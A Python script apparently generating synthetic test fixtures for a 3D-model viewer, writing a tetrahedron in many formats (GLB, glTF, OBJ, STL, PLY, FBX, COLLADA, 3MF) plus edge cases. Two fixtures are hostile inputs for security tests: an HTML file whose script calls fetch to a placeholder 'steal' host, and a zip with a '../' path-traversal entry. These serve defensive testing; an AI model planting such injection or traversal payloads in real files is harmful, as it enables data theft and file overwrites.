from pathlib import Path
import struct,json,zipfile,math,hashlib
root=Path(__file__).resolve().parent.parent/'fixtures';root.mkdir(exist_ok=True)
# Known test tetrahedron: intentionally synthetic QA assets, never displayed as historical reference.
pos=[-.5,0,-.35,.5,0,-.35,0,.7,.1,0,0,.55]
idx=[0,2,1,0,1,3,1,2,3,2,0,3]
bin_data=struct.pack('<12f',*pos)+struct.pack('<12H',*idx)
gltf={'asset':{'version':'2.0','generator':'Tiles Mother synthetic QA fixture'},'scene':0,'scenes':[{'nodes':[0]}],'nodes':[{'mesh':0}],'meshes':[{'primitives':[{'attributes':{'POSITION':0},'indices':1,'material':0}]}],'materials':[{'pbrMetallicRoughness':{'baseColorFactor':[.55,.4,.27,1],'metallicFactor':0,'roughnessFactor':.8},'doubleSided':True}],'buffers':[{'byteLength':len(bin_data)}],'bufferViews':[{'buffer':0,'byteOffset':0,'byteLength':48,'target':34962},{'buffer':0,'byteOffset':48,'byteLength':24,'target':34963}],'accessors':[{'bufferView':0,'componentType':5126,'count':4,'type':'VEC3','min':[-.5,0,-.35],'max':[.5,.7,.55]},{'bufferView':1,'componentType':5123,'count':12,'type':'SCALAR'}]}
b=json.dumps(gltf,separators=(',',':')).encode();b+=b' '*((-len(b))%4)
glb=struct.pack('<III',0x46546c67,2,12+8+len(b)+8+len(bin_data))+struct.pack('<II',len(b),0x4e4f534a)+b+struct.pack('<II',len(bin_data),0x004e4942)+bin_data
(root/'tile.GLB').write_bytes(glb)
gltf['buffers'][0]['uri']='mesh.bin';(root/'tile.gltf').write_text(json.dumps(gltf));(root/'mesh.bin').write_bytes(bin_data)
obj='mtllib materials.mtl\no QA_Tetra\n'+'\n'.join('v '+str(pos[i])+' '+str(pos[i+1])+' '+str(pos[i+2])for i in range(0,12,3))+'\nusemtl clay\n'+'\n'.join('f '+' '.join(str(j+1)for j in idx[i:i+3])for i in range(0,12,3))+'\n'
(root/'tile.obj').write_text(obj);(root/'materials.mtl').write_text('newmtl clay\nKd 0.58 0.43 0.29\nKs 0 0 0\nNs 8\n')
stl='solid qa\n'
for i in range(0,12,3):
 stl+='facet normal 0 1 0\n outer loop\n'
 for j in idx[i:i+3]:stl+='  vertex '+' '.join(map(str,pos[j*3:j*3+3]))+'\n'
 stl+=' endloop\nendfacet\n'
stl+='endsolid qa\n';(root/'tile.stl').write_text(stl)
ply='ply\nformat ascii 1.0\nelement vertex 4\nproperty float x\nproperty float y\nproperty float z\nelement face 4\nproperty list uchar int vertex_indices\nend_header\n'+'\n'.join(' '.join(map(str,pos[i:i+3]))for i in range(0,12,3))+'\n'+'\n'.join('3 '+' '.join(map(str,idx[i:i+3]))for i in range(0,12,3))+'\n';(root/'tile.ply').write_text(ply)
# Binary FBX 7400 with typed property arrays and a connected mesh.
class N:
 def __init__(self,name,props=(),children=()):self.name=name;self.props=list(props);self.children=list(children)
def prop(x):
 kind,val=x
 if kind=='S':b=val.encode();return b'S'+struct.pack('<I',len(b))+b
 if kind=='L':return b'L'+struct.pack('<q',val)
 if kind=='I':return b'I'+struct.pack('<i',val)
 if kind=='D':return b'D'+struct.pack('<d',val)
 if kind in ['d','i']:
  b=struct.pack('<'+('d' if kind=='d' else 'i')*len(val),*val);return kind.encode()+struct.pack('<III',len(val),0,len(b))+b
 raise ValueError(kind)
def node(n,start):
 name=n.name.encode();props=b''.join(prop(x)for x in n.props);payload=b''
 for child in n.children:payload+=node(child,start+13+len(name)+len(props)+len(payload))
 if n.children:payload+=b'\x00'*13
 end=start+13+len(name)+len(props)+len(payload)
 return struct.pack('<IIIB',end,len(n.props),len(props),len(name))+name+props+payload
pv=lambda name,*values:N('P',[('S',name),('S','Vector3D'),('S','Vector'),('S','')]+[('D',v)for v in values])
faces=[]
for i in range(0,12,3):faces+=idx[i:i+2]+[-idx[i+2]-1]
model=N('Model',[('L',100),('S','Model::QA_Tile'),('S','Mesh')],[N('Version',[('I',232)]),N('Properties70',children=[pv('Lcl Translation',0,0,0),pv('Lcl Rotation',0,0,0),pv('Lcl Scaling',1,1,1)])])
geom=N('Geometry',[('L',200),('S','Geometry::QA_Tile'),('S','Mesh')],[N('Vertices',[('d',pos)]),N('PolygonVertexIndex',[('i',faces)])])
roots=[N('FBXHeaderExtension',children=[N('FBXHeaderVersion',[('I',1003)]),N('FBXVersion',[('I',7400)])]),N('Objects',children=[model,geom]),N('Connections',children=[N('C',[('S','OO'),('L',200),('L',100)]),N('C',[('S','OO'),('L',100),('L',0)])])]
fbx=b'Kaydara FBX Binary  \x00\x1a\x00'+struct.pack('<I',7400)
for n in roots:fbx+=node(n,len(fbx))
fbx+=b'\x00'*13+b'\x00'*176
(root/'tile-binary.fbx').write_bytes(fbx)
(root/'unknown.blend').write_bytes(b'BLENDER-v300TEST-REFERENCE-BYTES\x00\xff\x10')
(root/'notes.txt').write_text('QA fixture only.\n尺寸待实测，原文件保持完整。')
(root/'malicious.html').write_text('<script>window.UNSAFE_EXECUTED=true;fetch("https://example.invalid/steal")</script><h1>source only</h1>')
(root/'invalid.glb').write_bytes(b'this is deliberately not a GLB')
with zipfile.ZipFile(root/'model-with-assets.zip','w',zipfile.ZIP_DEFLATED)as z:
 for name in ['tile.gltf','mesh.bin','notes.txt']:z.write(root/name,'完整资料/'+name)
with zipfile.ZipFile(root/'traversal.zip','w',zipfile.ZIP_DEFLATED)as z:z.writestr('../unsafe.txt','path-traversal-test')
(root/'checksums.json').write_text(json.dumps({p.name:hashlib.sha256(p.read_bytes()).hexdigest()for p in root.glob('*')if p.is_file()},indent=2))
print(root)
# COLLADA and 3MF fixtures exercise the additional installed readers.
dae='''<?xml version="1.0" encoding="utf-8"?><COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1"><asset><created>2026-08-31T00:00:00</created><modified>2026-08-31T00:00:00</modified><unit meter="1" name="meter"/><up_axis>Y_UP</up_axis></asset><library_geometries><geometry id="geo" name="QA"><mesh><source id="positions"><float_array id="positions-array" count="12">'''+ ' '.join(map(str,pos))+'''</float_array><technique_common><accessor source="#positions-array" count="4" stride="3"><param name="X" type="float"/><param name="Y" type="float"/><param name="Z" type="float"/></accessor></technique_common></source><vertices id="verts"><input semantic="POSITION" source="#positions"/></vertices><triangles count="4"><input semantic="VERTEX" source="#verts" offset="0"/><p>'''+ ' '.join(map(str,idx))+'''</p></triangles></mesh></geometry></library_geometries><library_visual_scenes><visual_scene id="Scene"><node id="QA"><instance_geometry url="#geo"/></node></visual_scene></library_visual_scenes><scene><instance_visual_scene url="#Scene"/></scene></COLLADA>'''
(root/'tile.dae').write_text(dae)
model='''<?xml version="1.0" encoding="utf-8"?><model unit="millimeter" xml:lang="en-US" xmlns="http://schemas.microsoft.com/3dmanufacturing/core/2015/02"><resources><object id="1" type="model"><mesh><vertices>'''+''.join('<vertex x="%s" y="%s" z="%s"/>'%tuple(pos[i:i+3])for i in range(0,12,3))+'''</vertices><triangles>'''+''.join('<triangle v1="%d" v2="%d" v3="%d"/>'%tuple(idx[i:i+3])for i in range(0,12,3))+'''</triangles></mesh></object></resources><build><item objectid="1"/></build></model>'''
with zipfile.ZipFile(root/'tile.3mf','w',zipfile.ZIP_DEFLATED)as z:
 z.writestr('3D/3dmodel.model',model)
 z.writestr('_rels/.rels','''<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Target="/3D/3dmodel.model" Id="rel0" Type="http://schemas.microsoft.com/3dmanufacturing/2013/01/3dmodel"/></Relationships>''')
 z.writestr('[Content_Types].xml','''<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="model" ContentType="application/vnd.ms-package.3dmanufacturing-3dmodel+xml"/></Types>''')
# A nested directory is kept intact by the actual browser folder chooser.
folder=root/'资料文件夹';folder.mkdir(exist_ok=True)
for name in ['tile.gltf','mesh.bin','notes.txt']:(folder/name).write_bytes((root/name).read_bytes())
